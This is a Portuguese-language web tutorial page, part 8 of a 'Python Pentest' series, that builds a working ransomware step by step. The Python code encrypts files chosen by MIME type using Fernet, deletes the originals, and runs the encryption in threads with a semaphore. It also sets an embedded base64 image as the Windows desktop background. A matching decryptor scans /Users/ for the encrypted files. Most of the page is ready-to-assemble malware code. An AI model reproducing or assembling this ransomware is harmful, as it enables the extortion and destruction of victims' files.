<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8"/>
        <link rel="icon" href="imagens/favicon.ico"/>
        <title>Aprenda Python Pentest</title>
        <link rel="stylesheet" href="css/estilo.css"/>
    </head>
    <body>
        <div>
            <header>
                <h1>Aprenda Python Pentest</h1>
                <menu>
                    <li><a href="index.html">Página Inicial</a></li>
                    <li><a href="contato.html">Contato!</a></li>
                    <li><a href="tudo-sobre-python-pentest-1.html">Tudo sobre Python Pentest Parte 1!</a></li>
                    <li><a href="tudo-sobre-python-pentest-2.html">Tudo sobre Python Pentest Parte 2!</a></li>
                    <li><a href="tudo-sobre-python-pentest-3.html">Tudo sobre Python Pentest Parte 3!</a></li>
                    <li><a href="tudo-sobre-python-pentest-4.html">Tudo sobre Python Pentest Parte 4!</a></li>
                    <li><a href="tudo-sobre-python-pentest-5.html">Tudo sobre Python Pentest Parte 5!</a></li>
                    <li><a href="tudo-sobre-python-pentest-6.html">Tudo sobre Python Pentest Parte 6!</a></li>
                    <li><a href="tudo-sobre-python-pentest-7.html">Tudo sobre Python Pentest Parte 7!</a></li>
                    <li><a href="tudo-sobre-python-pentest-8.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Python Pentest Parte 8!</a></li>
                    <li><a href="tudo-sobre-python-pentest-9.html">Tudo sobre Python Pentest Parte 9!</a></li>
                    <li><a href="tudo-sobre-python-pentest-10.html">Tudo sobre Python Pentest Parte 10!</a></li>
                </menu>
            </header>
           
<h2>Tudo sobre Python Pentest Parte 8</h2>

<h3>Trabalhando com Criptografia</h3>

<p>Agora vamos fazer a função mais importante do nosso script, que é a criptografia de arquivos. Vamos salvar alguns arquivos em PDF como exemplo pra testarmos nosso ransom.</p>

<p>Primeiramente, instale a biblioteca <code>cryptography</code>. Vamos trabalhar com criptografia AES, que é uma criptografia simétrica (de chave privada, que usa uma única chave). Vamos utilizar a classe Fernet, que permite trabalhar com isso. Escreva esse código:</p>

<pre>
<code>
from cryptography.fernet import Fernet

key = Fernet.generate_key() # Gerando chave privada com salt, no caso AES-256

file = "python.pdf" # Arquivo

print(key)
</code>
</pre>

<p>A chave deverá ser algo tipo <code>bYkj6evO0PD9Ba8zG3kvurba5eyisV48kg-ttdU5uqg=</code>, que é sempre aleatório. Podemos decodificar essa chave nesse site aqui: <a href="https://www.base64decode.org/" target="_blank">https://www.base64decode.org/</a></p>

<p>Pra encriptar o arquivo, fazemos assim:</p>

<pre>
<code>
from cryptography.fernet import Fernet

key = Fernet.generate_key() # Gerando chave privada com salt, no caso AES-256

file = "python.pdf" # Arquivo

fern = Fernet(key)

with open(file, "rb") as arqPl: # rb é pra ler arquivos como bytes
    data = arqPl.read() # Lendo o arquivo

encData = fern.encrypt(data) # Encriptando o arquivo

print(encData)
</code>
</pre>

<p>PS: Dependendo do tamanho do arquivo, pode demorar pra criptografar.</p>

<p>No lugar do último print, podemos colocar assim:</p>

<pre>
<code>
with open(f"{file}.encp", "wb") as arqCr: # wb é pra escrever arquivos como bytes
    data = arqCr.write(encData) # Escrever o arquivo
</code>
</pre>

<p>Veja o programa completo, onde ele, depois de criptografar, exclui o arquivo original:</p>

<pre>
<code>
from cryptography.fernet import Fernet
import os

key = Fernet.generate_key() # Gerando chave privada com salt, no caso AES-256

print(key)

file = "python.pdf" # Arquivo

fern = Fernet(key)

with open(file, "rb") as arqPl: # rb é pra ler arquivos como bytes
    data = arqPl.read() # Lendo o arquivo

encData = fern.encrypt(data) # Encriptando o arquivo

with open(f"{file}.encp", "wb") as arqCr: # wb é pra escrever arquivos como bytes
    data = arqCr.write(encData) # Escrever o arquivo
    os.remove(file)
</code>
</pre>

<p>PS: Salve a chave pra podermos descriptografar, é algo como <code>bYkj6evO0PD9Ba8zG3kvurba5eyisV48kg-ttdU5uqg=</code>.</p>

<p>Reescrevendo o programa com funções:</p>

<pre>
<code>
from cryptography.fernet import Fernet
import os

def encrypt(file, key):
    fern = Fernet(key)

    with open(file, "rb") as arqPl:
        data = arqPl.read()

    encData = fern.encrypt(data)

    with open(f"{file}.encp", "wb") as arqCr:
        arqCr.write(encData)
        os.remove(file)

key = Fernet.generate_key()

print(key)

file = "python.pdf"

encrypt(file, key)
</code>
</pre>

<p>Da mesma forma, crie essa função pra descriptografar o arquivo:</p>

<pre>
<code>
def decrypt(file, key):
    fern = Fernet(key)

    with open(file, "rb") as arqCr:
        encData = arqCr.read()

    data = fern.decrypt(encData)

    with open(file.replace(".encp", ""), "wb") as arqPl:
        arqPl.write(data)
        os.remove(file)
</code>
</pre>

<p>E pra descriptografar, altere abaixo das funções assim:</p>

<pre>
<code>
key = b"bYkj6evO0PD9Ba8zG3kvurba5eyisV48kg-ttdU5uqg=" # A chave criada anteriormente

print(key)

file = "python.pdf.encp" # Arquivo criptografado

decrypt(file, key)
</code>
</pre>

<p>PS: Num ransomware real, os arquivos de criptografia e descriptografia são diferentes, por motivos óbvios.</p>

<p>Daí, no arquivo de ransom, basta colocar essa função:</p>

<pre>
<code>
from cryptography.fernet import Fernet

def encrypt(file, key):
    fern = Fernet(key)

    with open(file, "rb") as arqPl:
        data = arqPl.read()

    encData = fern.encrypt(data)

    with open(f"{file}.encp", "wb") as arqCr:
        arqCr.write(encData)
        os.remove(file)
</code>
</pre>

<p>E no final do código, fazemos assim:</p>

<pre>
<code>
key = Fernet.generate_key()

for fl in files:
    encrypt(fl, key)    
</code>
</pre>

<p>Defina na área de variáveis essas tuplas:</p>

<pre>
<code>
global whitelist
# whitelist = ("image/jpeg", "image/png", "image/gif", "audio/mpeg", "video/mp4", "application/pdf", "text/plain")
whitelist = ("video/mp4", "application/pdf")
</code>
</pre>

<p>E no if de checkFile, apenas deixe assim:</p>

<pre>
<code>
if fType in whitelist:
    files.append(file)
</code>
</pre>

<p>E aí, podemos também chamar a função com threads, assim:</p>

<pre>
<code>
for fl in files:
    th = threading.Thread(target = encrypt, args = (fl, key,))
    th.start()
</code>
</pre>

<p>Podemos também colocar um semáforo, declarando a variável como global:</p>

<pre>
<code>
global semaforo
semaforo = threading.Semaphore(5)
</code>
</pre>

<p>E identando tudo na função encrypt:</p>

<pre>
<code>
def encrypt(file, key):
    with semaforo:
        fern = Fernet(key)
    
        with open(file, "rb") as arqPl:
            data = arqPl.read()
    
        encData = fern.encrypt(data)
    
        with open(f"{file}.encp", "wb") as arqCr:
            arqCr.write(encData)
            os.remove(file)
</code>
</pre>

<h3>Decrypter e Alterar Background</h3>

<p>Num ransomware, uma imagem não ficaria num diretório, e sim seria codificada no script Python. Pra carregar a imagem, devemos transformar ela em base64.</p>

<p>Num arquivo de teste, faça assim:</p>

<pre>
<code>
import base64

with open("background.jpg", "rb") as arqImg:
    data = arqImg.read()

    print(base64.b64encode(data))
</code>
</pre>

<p>Daí, é só salvar os bytes assim:</p>

<pre>
<code>
import base64
import ctypes

def mudarBackground():
    img = b"" # Coloque o código referente à imagem aqui

    with open("bg.jpg", "wb") as arqImg:
        data = base64.b64decode(img)
        arqImg.write(data)

mudarBackground()
</code>
</pre>

<p>PS: Você pode ativar a quebra de linha no editor pra visualizar melhor o código, nesse caso, procure uma opção algo como "Soft Wrap", no PyCharm você encontra essa opção clicando num dos números das linhas.</p>

<p>E pra mudar o background:</p>

<pre>
<code>
import base64
import ctypes
import os

def mudarBackground():
    path = "bg.jpg"
    img = b"" # Coloque o código referente à imagem aqui

    with open(path, "wb") as arqImg:
        data = base64.b64decode(img)
        arqImg.write(data)

    path = os.path.abspath(path)

    # Isso altera o background
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3) # 20 significa mudar o background e 3 é imediado

mudarBackground()
</code>
</pre>

<p>PS: Podemos pegar um exemplo de código de imagem <a href="files/imagem-codificada.txt" target="_blank">clicando aqui</a>.</p>

<p>No código do ransom, coloque esse código:</p>

<pre>
<code>
import base64
import ctypes

def mudarBackground():
    path = "bg.jpg"
    img = b"" # Coloque o código referente à imagem aqui
    
    with open(path, "wb") as arqImg:
        data = base64.b64decode(img)
        arqImg.write(data)
        
    path = os.path.abspath(path)
    
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
</code>
</pre>

<p>No final do código, deixe assim:</p>

<pre>
<code>
key = Fernet.generate_key()

print(key)

for fl in files:
    th = threading.Thread(target = encrypt, args = (fl, key,))
    th.start()
    
mudarBackground()
</code>
</pre>

<p>PS: Como a mudança do background acontece depois da criptografia de arquivos, a imagem criada não é criptografada, mesmo se mandarmos criptografar as mesmas.</p>

<p>Pra fazer o decriptador, nós salvamos o arquivo de ransom como um novo arquivo, e deixamos ele assim:</p>

<pre>
<code>
import os
import threading
from cryptography.fernet import Fernet

def decrypt(file, key):
    with semaforo:
        fern = Fernet(key)

        with open(file, "rb") as arqCr:
            encData = arqCr.read()

        data = fern.decrypt(encData)

        with open(file.replace(".encp", ""), "wb") as arqPl:
            arqPl.write(data)
            os.remove(file)

def listarDir(path):
    try:
        for fl in os.listdir(path):
            if os.path.isdir(f"{path}{fl}"):
                dirs.append(f"{path}{fl}/")
            elif fl.split(".")[-1] == "encp":
                files.append(f"{path}{fl}")
    except PermissionError:
        pass

global files
files = list()

global dirs
dirs = list()

global semaforo
semaforo = threading.Semaphore(5)

listarDir("/Users/")

if len(dirs) >= 0:
    thrd = list()

    for d in dirs:
        th = threading.Thread(target = listarDir, args = (d,))
        thrd.append(th)
        th.start()

    for t in thrd:
        t.join()

print("Finalizou!")

key = b"bYkj6evO0PD9Ba8zG3kvurba5eyisV48kg-ttdU5uqg=" # A chave criada
 
print(key)

for fl in files:
    th = threading.Thread(target = decrypt, args = (fl, key,))
    th.start()
</code>
</pre>

<ul>
    <li><a href="tudo-sobre-python-pentest-7.html">Parte Anterior da Matéria!</a></li>
    <li><a href="tudo-sobre-python-pentest-9.html">Continuação da Matéria!</a></li>
</ul>

        </div>
    </body>
</html>